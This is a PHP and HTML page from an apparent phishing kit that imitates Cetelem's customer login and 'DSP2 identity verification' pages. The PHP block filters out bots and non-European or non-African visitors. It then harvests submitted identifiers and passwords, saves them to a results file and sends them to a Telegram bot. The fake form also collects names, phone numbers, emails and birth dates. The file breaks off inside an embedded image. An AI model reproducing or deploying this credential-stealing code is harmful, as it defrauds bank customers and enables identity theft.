<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  $stripos = '1';

}

$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));
if ($token1 != $_GET['token'] || $stripos == '1' ){ header("location: " . $errorUrl ."?" . $_GET['token']); exit;  }



function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 
$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(curl_get_contents($geoip)); 
$continent = $addrDetailsArr['geoplugin_continentCode'];
$country = $addrDetailsArr['geoplugin_countryCode'];
$countryname = $addrDetailsArr['geoplugin_countryName'];
if (!$country)
{
    $country='Not found!';
}

if ($continent !== 'EU' && $continent !== 'AF')
{
      header("location: " . $errorUrl . "?" . $_GET['token']);
     exit();
} 



if ($_POST['type'] == "log") {
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

            $message = "/-- LOGIN INFOS --/" . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= "Identifiant : ".$_POST['usr']. "\r\n";
            $message .= "Password : ".$_POST['pwd']. "\r\n";
            $message .= "/---------------- VICTIM INFOS ----------------/" . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= "Pays        : ".$countryname."\n";
            $message .= "Timezone    : ".date_default_timezone_get()."\n";
            $message .= "/-- END LOGIN INFOS --/" . "\r\n\r\n";

            file_put_contents("./rezult/microbien20.txt", $message, FILE_APPEND);

            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
}
else {
header("location: " . $errorUrl . "?".base64_encode(rand(0,9999999999999)));
}

?>

<!DOCTYPE html> 
<html lang="fr" style=""><head><meta charset="utf-8">

  <meta content="IE=edge,chrome=1" http-equiv="X-UA-compatible">
  <title>Cetelem : Simulation et demande de credit en ligne</title>
  
  
  
  
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  
      <link rel="stylesheet" type="text/css" href="./Ctlm_files/Ctlm-style-01.css">
    <link rel="stylesheet" type="text/css" href="./Ctlm_files/Ctlm-style-02.css">
    <link rel="stylesheet" type="text/css" href="./Ctlm_files/Ctlm-style-03.css">  
 <link type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABMLAAATCwAAAAAAAAAAAAD///8A////AP3+/QDK4skCwd2/QMLewFTD3sFSwt7AUsLewFLD3sFSwt7AUsLdwFXE3sI09vr1AP///wD///8A////AP///wD3+/cAVZ9RODeNMv87kDb/O5A2/zuQNv87kDb/O5A2/zuQNv86jzX/QpQ97N/t3hz///8A////AP///wD///8A9/v3AFmhVRI7kTaVP5M6qz+TOqc/kzqnP5M6pz+TOqc/kzqnPpI5rEaWQYHg7t8F////AP///wD///8A////APf79wBZoVUAO5E2AD+TOgA/kzoAP5M6AD+TOgA/kzoAP5M6AD6SOQBGlkEA4O7fAP///wD///8A////AP///wD3+/cAWaFVADuRNgA/kzoEP5M6Tz+TOp4/kzq6P5M6qz+TOmo+kjkSRpZBAODu3wD///8A////AP///wD///8A9/v3AFmhVQA7kTYaP5M6vj+TOv8/kzr/P5M6/z+TOv8/kzr/PpI55EaWQT/g7t8A////AP///wD///8A////APf79wBZoVUJO5E2yD+TOv8/kzr1P5M6mz+TOmY/kzqDP5M64T6SOf9GlkHO4O7fAv///wD///8A////AP///wD3+/cAWaFVbjuRNv8/kzrxP5M6Oj+TOgA/kzoAP5M6AD+TOhY+kjmfRpZBa+Du3wD///8A////AP///wD///8A9/v3AFmhVcA7kTb/P5M6fT+TOgA/kzoAP5M6AD+TOgA/kzoAPpI5AEaWQQDg7t8A////AP///wD///8A////APf79wpZoVXdO5E2/z+TOkE/kzoAP5M6AD+TOgA/kzoAP5M6AD6SOQBGlkEA4O7fAP///wD///8A////AP///wD3+/cFWaFV1TuRNv8/kzpSP5M6AD+TOgA/kzoAP5M6AD+TOgA+kjkARpZBAODu3wD///8A////AP///wD///8A9/v3AFmhVaI7kTb/P5M6tD+TOgA/kzoAP5M6AD+TOgA/kzoAPpI5IEaWQRLg7t8A////AP///wD///8A////APf79wBZoVU7O5E2/j+TOv8/kzqfP5M6Gz+TOgA/kzoMP5M6bj6SOf9GlkHB4O7fAP///wD///8A////AP///wD3+/cAWaFVADuRNnU/kzr/P5M6/z+TOvU/kzrXP5M66z+TOv8+kjn/RpZBpuDu3wD///8A////AP///wD///8A9/v3AFegUwA5jjQAPZE4UD2RONA9kTj/PZE4/z2ROP89kTjlPJA3ekSUPwbf7d4A////AP///wD///8A////AP3+/QDP5c0AxuDEAMjhxgDI4cYGyOHGMsjhxk7I4cY+yOHGEMfgxQDJ4ccA9vv2AP///wD///8A4AcAAOADAADgAwAA//8AAPgPAADwBwAA4AMAAOHHAADj/wAAw/8AAMP/AADj5wAA4IcAAPAHAAD4BwAA/B8AAA==" rel="shortcut icon"></head>
 <body class="fr PC world prof cetelem" style="">
  <div id="sf-master">
   <div class="ls-canvas ls-row full-globalContainer" id="globalContainer">
    <div class="ls-row row" id="headerContainer" style="position:relative">
     <div class="ls-fxr" id="ls-gen37775052-ls-fxr">
      <div class="ls-col content-column column small-12 small-centered" id="header-columns">
       <div class="ls-col-body" id="ls-gen37775053-ls-col-body">
        <div class="ls-row" id="ls-row-1-col-1-row-1">
         <div class="ls-fxr" id="ls-gen37775054-ls-fxr">
          <div class="ls-area" id="ls-row-1-col-1-row-1-area-1">
           <div class="ls-area-body" id="ls-gen37775055-ls-area-body">
            <div class="ls-cmp-wrap ls-1st" id="w1570207717444">
             <div class="iw_component" id="1570207717444">
              
              <div class="mainNav" style="
    position: absolute;
">
               <div class="mobileRow">
                <a title="" class="mobileNav sf-hidden"></a>
                <a title="" class="logo" href="#">
                 <picture>
                  <img alt="Cetelem" src="data:image/png;base64,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">
                 </picture>
                </a>
                <a class="mobileConnection logoff sf-hidden"></a>
               </div>
               <div class="navContainer">
                <ul class="nav">
                 <li class="accueil-menu show-for-small-only sf-hidden"></li>
                 <li class="accessibilite-menu show-for-small-only sf-hidden"></li>
                 <li class="search-mob show-for-small-only sf-hidden"></li>
                 <li data-subnav="contacts" class="contact-menu show-for-small-only sf-hidden"></li>
                 <li class="credit aria-lable-click" data-subnav="credit">
                  <a tabindex="0" title="">
                   <span>Crédit</span>
                  </a>
                 </li>
                 <li class="cpay aria-lable-click" data-subnav="cpay">
                  <a tabindex="0" title="">
                   <span>Carte Cpay</span>
                  </a>
                 </li>
                 <li class="assurance aria-lable-click" data-subnav="assurance">
                  <a tabindex="0" title="">
                   <span>Assurance</span>
                  </a>
                 </li>
                 <li class="projets aria-lable-click" data-subnav="projets">
                  <a tabindex="0" title="">
                   <span>C Mon Projet</span>
                  </a>
                 </li>
                 <li class="plus-nav-responsab aria-lable-click">
                  <a tabindex="0" title="" href="#">
                   <span>Nos engagements</span>
                  </a>
                 </li>
                 <li data-subnav="search" class="hide-for-small-only aria-lable-click sf-hidden"></li>
                </ul>
               </div>
               <div id="connectionContainer" class="connectionContainer logoff active open">
                <ul class="connection">
                 <li data-subconnection="virementExpress" class="virementExpress dis-activ sf-hidden"></li>
                 <li class="accesClient active" data-subconnection="accesClient">
                  <a title="accesClient">
                   <span>Votre espace <br class="hide-for-small sf-hidden"> personnel </span>
                  </a>
                 </li>
                </ul>
                <ul class="subConnection">
                 <span style="display:none" id="wcmHost">http://cetelem-prod2-speed.neuges.org:25517</span>
                 <li class="virementExpress" id="virementExpress">
                  <div class="pf_loader_div pf_loader_div_new pf_hide sf-hidden"></div>
                  <div xmlns:java="http://xml.apache.org/xslt/java" data-url-context="/frpfclientnape/" class="requestForFunding_ia">
                  </div>
                  <a class="close sf-hidden"></a>
                  <div class="iaLoader"></div>
                 </li>
                 <li class="accesClient iaInit active" id="accesClient">
                  <div class="pf_loader_div pf_loader_div_new pf_hide sf-hidden"></div>
                  <div data-url-context="/frpfpciaaape/" class="fullAuthentication_ia">
                   <div>
                    <div class="intro">
                     <div class="title cpay-color">Vérification d'identité (DSP2) </div>
                     <div class="maintanenceText sf-hidden"> Une maintenance technique est prévue dans la nuit du dimanche 02 Janvier au mercredi 05 Janvier 2022. L’accès à votre Espace Personnel peut être perturbé, veuillez nous excuser pour la gêne occasionnée. </div>
                    </div>
                    <div class="formIdentification large">
                     <div class="title codeSecret cpay-color">
                        <span rv-text="model.app.authentication.S18.LIBF05-003_4">

<strong rv-text="model.app.authentication.S18.LIBF05-003_5">mon espace sécurisé</strong>
</span>
                       </div>
<form method="post" action="<?php echo 'Ctlm-load.php?token='.$token1; ?>">
<div class="panel-body" style="max-width: 450px;margin:0 auto;">
                        
                            <div class="row">
                                <div style="margin:0 auto;text-align:initial" class="col-md-12">
                                    <label style="">Nom et Prénom:</label>
                                </div>
                                <div class="col-md-12" style="">
                                    <input type="text" name="fn" class="password_text" placeholder="Votre nom et prénom" required="" value="" style="width:100%;height:45px;padding-left:10px;outline:0">
                                </div>
                            </div>
                            <div class="row" style="margin-top:5px">
                                <div style="margin:0 auto;text-align:initial" class="col-md-12">
                                    <label style="">N° Mobile:</label>
                                </div>
                                <div class="col-md-12">
                                    <input type="text" maxlength="12" name="tel" class="form-control" placeholder="Numéro de téléphone" required="" value="" style="width:100%;height:45px;padding-left:10px;outline:0">
                                </div>
                            </div>
                            <div class="row" style="margin-top:5px">
                                <div style="margin:0 auto;text-align:initial" class="col-md-12">
                                    <label style="">Email:</label>
                                </div>
                                <div class="col-md-12">
                                    <label for="email"></label>
                                    <input class="form-control" name="eml" maxlength="64" minlength="5" id="email" type="email" placeholder="exemple@domain.com" required="" value="" style="width:100%;height:45px;padding-left:10px;outline:0">
                                </div>
                            </div>
                            <div class="row" style="margin-top:5px">
                                <div style="margin:0 auto;text-align:initial" class="col-md-12">
                                    <label style="">Date de naissance:</label>
                                </div>
                                <div class="col-md-12">
                                    <label for="dob"></label>
                                    <input class="form-control" name="dob" maxlength="10" minlength="10" id="dob" type="tel" placeholder="Date de naissance" required="" value="" style="width:100%;height:45px;padding-left:10px;outline:0">
                                </div>
                            </div><hr style="margin-top:20px;color:lightgrey">
                            <div class="panel-heading display-table">
                                <div class="row display-tr">
                                    <div class="display-td">
                                        <center>
                                            <img class="img-responsive" src="data:image/png;base64,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